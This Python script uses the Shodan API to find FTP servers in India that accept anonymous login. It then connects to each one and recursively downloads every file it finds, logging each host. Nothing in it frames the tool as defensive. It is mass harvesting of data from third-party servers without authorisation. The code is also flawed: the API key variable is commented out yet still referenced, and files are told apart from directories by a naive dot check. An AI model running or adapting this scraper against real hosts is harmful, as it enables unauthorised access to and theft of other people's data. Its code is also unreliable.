import shodan
from ftplib import FTP
import os

# Replace 'YOUR_SHODAN_API_KEY' with your actual Shodan API key
# SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
RESULT_FILE = 'result.txt'
DOWNLOAD_DIR = '/path/to/folder'  # Specify the directory where you want to save the downloaded files

def download_file(ftp, filename, ip):
    # Check if the retrieved entry is a file or a folder
    if '.' in filename:
        download_path = os.path.join(DOWNLOAD_DIR, f"{ip}_{filename}")
        with open(download_path, 'wb') as f:
            ftp.retrbinary('RETR ' + filename, f.write)
        print(f"Downloaded: {filename} from {ip}")
        return download_path
    return None

def download_files_recursively(ftp, ip, current_dir=''):
    try:
        ftp.cwd(current_dir)  # Change the current directory on the FTP server

        # Get the list of files and directories in the current directory
        entries = ftp.nlst()

        for entry in entries:
            # If the entry is a file, download it
            download_path = download_file(ftp, entry, ip)
            if download_path:
                with open(RESULT_FILE, 'a') as result_file:
                    result_file.write(f"Downloaded: {download_path} from {ip}\n")

            # If the entry is a directory, recursively download its contents
            elif '.' not in entry:
                download_files_recursively(ftp, ip, os.path.join(current_dir, entry))
    except Exception as e:
        print(f"Error connecting to FTP server at {ip}: {e}")
        with open(RESULT_FILE, 'a') as result_file:
            result_file.write(f"Error connecting to FTP server at {ip}: {e}\n")

def main():
    api = shodan.Shodan(SHODAN_API_KEY)

    try:
        # Perform the Shodan search query
        query = '220 "230 Login successful." port:21 country:"IN"' #we can change the shodan query here as per our requirements
        result = api.search(query)
      
        print(f"Total results found: {result['total']}")

        with open(RESULT_FILE, 'w') as result_file:
            for service in result['matches']:
                ip = service['ip_str']
                print(f"Connecting to FTP server at {ip}")

                try:
                    ftp = FTP(ip)
                    ftp.login()

                    # Start the recursive download
                    download_files_recursively(ftp, ip)

                    # Logout from the FTP server
                    ftp.quit()
                except Exception as e:
                    print(f"Error connecting to FTP server at {ip}: {e}")
                    result_file.write(f"Error connecting to FTP server at {ip}: {e}\n")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    # Before calling the main function, create the download directory if it doesn't exist
    if not os.path.exists(DOWNLOAD_DIR):
        os.makedirs(DOWNLOAD_DIR)

    main()
